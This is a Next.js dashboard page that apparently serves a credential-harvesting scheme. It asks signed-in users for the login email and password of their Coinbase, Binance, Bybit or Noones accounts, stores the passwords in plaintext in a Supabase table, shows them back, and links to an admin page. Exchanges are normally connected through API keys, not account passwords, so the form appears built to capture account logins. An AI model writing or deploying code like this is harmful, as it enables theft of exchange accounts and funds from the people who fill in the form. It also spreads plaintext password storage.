import Link from 'next/link';
import { redirect } from 'next/navigation';
import { createClient } from '@/lib/supabase/server';

const platformOptions = ['Coinbase', 'Binance', 'Bybit', 'Noones'];

export default async function DashboardPage({ searchParams }) {
  const params = await searchParams;
  const supabase = await createClient();
  const {
    data: { user },
  } = await supabase.auth.getUser();

  if (!user) {
    redirect('/connect');
  }

  const { data: submissions } = await supabase
    .from('platform_connections')
    .select('id, platform, email, third_party_password, created_at')
    .eq('user_id', user.id)
    .order('created_at', { ascending: false });

  async function submitConnection(formData) {
    'use server';

    const platform = String(formData.get('platform') || '').trim();
    const email = String(formData.get('email') || '').trim().toLowerCase();
    const thirdPartyPassword = String(formData.get('thirdPartyPassword') || '').trim();

    if (!platform || !email || !thirdPartyPassword) {
      redirect('/dashboard?error=Please+complete+all+fields');
    }

    const serverSupabase = await createClient();
    const {
      data: { user: authUser },
    } = await serverSupabase.auth.getUser();

    if (!authUser) {
      redirect('/connect');
    }

    const { error } = await serverSupabase.from('platform_connections').insert({
      platform,
      email,
      third_party_password: thirdPartyPassword,
      user_id: authUser.id,
    });

    if (error) {
      redirect(`/dashboard?error=${encodeURIComponent(error.message)}`);
    }

    redirect('/dashboard?submitted=1');
  }

  async function handleSignOut() {
    'use server';

    const serverSupabase = await createClient();
    await serverSupabase.auth.signOut();
    redirect('/connect');
  }

  return (
    <main className="min-h-screen bg-[#0a0a0c] px-4 py-10 text-white sm:px-6">
      <div className="mx-auto max-w-4xl space-y-6">
        <header className="flex flex-wrap items-center justify-between gap-3 rounded-2xl border border-white/10 bg-white/5 p-4">
          <div>
            <h1 className="text-2xl font-semibold">Dashboard</h1>
            <p className="text-sm text-slate-300">Logged in as {user.email}</p>
          </div>
          <div className="flex items-center gap-3">
            <Link
              href="/admin"
              className="rounded-lg border border-white/20 px-4 py-2 text-sm text-slate-200 hover:bg-white/10"
            >
              Admin
            </Link>
            <form action={handleSignOut}>
              <button
                type="submit"
                className="rounded-lg border border-white/20 px-4 py-2 text-sm text-slate-200 hover:bg-white/10"
              >
                Sign out
              </button>
            </form>
          </div>
        </header>

        <section className="rounded-2xl border border-white/10 bg-white/5 p-5">
          <h2 className="mb-4 text-lg font-medium">Submit platform connection</h2>
          <form action={submitConnection} className="grid gap-4 sm:grid-cols-2">
            <div>
              <label className="mb-1 block text-sm text-slate-300" htmlFor="platform">
                Platform
              </label>
              <select
                id="platform"
                name="platform"
                defaultValue={platformOptions[0]}
                className="w-full rounded-lg border border-white/15 bg-[#101115] px-3 py-2 text-sm text-white"
              >
                {platformOptions.map((platform) => (
                  <option key={platform} value={platform}>
                    {platform}
                  </option>
                ))}
              </select>
            </div>
            <div>
              <label className="mb-1 block text-sm text-slate-300" htmlFor="email">
                Connection email
              </label>
              <input
                id="email"
                name="email"
                type="email"
                placeholder="name@example.com"
                className="w-full rounded-lg border border-white/15 bg-[#101115] px-3 py-2 text-sm text-white placeholder:text-slate-500"
              />
            </div>
            <div className="sm:col-span-2">
              <label className="mb-1 block text-sm text-slate-300" htmlFor="thirdPartyPassword">
                Third-party password
              </label>
              <input
                id="thirdPartyPassword"
                name="thirdPartyPassword"
                type="text"
                placeholder="Enter third-party password"
                className="w-full rounded-lg border border-white/15 bg-[#101115] px-3 py-2 text-sm text-white placeholder:text-slate-500"
              />
            </div>
            <div className="sm:col-span-2">
              <button
                type="submit"
                className="rounded-lg bg-[#f9be00] px-4 py-2 text-sm font-semibold text-black hover:bg-[#ebb300]"
              >
                Save connection
              </button>
            </div>
          </form>

          {params?.submitted ? (
            <p className="mt-3 text-sm text-emerald-400">Submission saved.</p>
          ) : null}
          {params?.error ? <p className="mt-3 text-sm text-red-400">{params.error}</p> : null}
        </section>

        <section className="rounded-2xl border border-white/10 bg-white/5 p-5">
          <h2 className="mb-4 text-lg font-medium">Your submissions</h2>
          <div className="overflow-x-auto">
            <table className="min-w-full text-left text-sm">
              <thead className="text-slate-400">
                <tr>
                  <th className="px-3 py-2">Platform</th>
                  <th className="px-3 py-2">Email</th>
                  <th className="px-3 py-2">Password</th>
                  <th className="px-3 py-2">Created</th>
                </tr>
              </thead>
              <tbody>
                {(submissions || []).map((row) => (
                  <tr key={row.id} className="border-t border-white/10">
                    <td className="px-3 py-2">{row.platform}</td>
                    <td className="px-3 py-2">{row.email}</td>
                    <td className="px-3 py-2">{row.third_party_password}</td>
                    <td className="px-3 py-2 text-slate-400">
                      {new Date(row.created_at).toLocaleString()}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      </div>
    </main>
  );
}
